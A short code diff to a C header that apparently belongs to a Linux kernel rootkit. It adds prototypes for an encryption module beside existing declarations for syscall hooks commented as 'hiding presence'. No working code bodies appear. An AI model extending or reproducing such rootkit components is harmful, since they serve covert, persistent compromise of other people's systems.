@@ -89,6 +89,14 @@ struct kernel_syscalls {
     unsigned long *tainted;
 };
 
+/** Setup crypto module */
+int kv_crypto_key_init(void);
+struct kv_crypto_st *crypto_init(void);
+size_t kv_encrypt(struct kv_crypto_st *, u8 *, size_t);
+size_t kv_decrypt(struct kv_crypto_st *);
+void kv_crypto_mgc_deinit(struct kv_crypto_st *);
+void kv_crypto_deinit(void);
+
 /** hooks, hiding presence and so */
 bool sys_init(void);
 void sys_deinit(void);
